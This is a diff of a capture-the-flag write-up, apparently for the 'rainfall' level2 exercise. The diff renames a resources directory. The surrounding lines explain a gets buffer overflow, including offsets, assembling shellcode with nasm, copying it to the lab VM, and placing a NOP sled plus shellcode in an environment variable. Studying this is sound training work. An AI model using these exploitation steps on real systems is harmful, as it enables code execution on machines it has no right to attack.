@@ -24,8 +24,8 @@ Since the buffer used by gets is located at ebp-0x4c, we have got 76 bytes to fi
 After those bytes, we have got 4 bytes of the stored ebp to fill, then the return eip, then the second return eip.
 
 We assemble our shellcode:
-nasm ./ressources/shellcode.asm
-[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level1/flag | clipboard ; scp -P 4242 ./ressources/shellcode level2@rainfall:/tmp
+nasm ./Resource/shellcode.asm
+[Upload the resulting ./Resource/shellcode to the vm at /tmp] : cat ../level1/flag | clipboard ; scp -P 4242 ./Resource/shellcode level2@rainfall:/tmp
 
 export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 90000)'``cat /tmp/shellcode`"
 
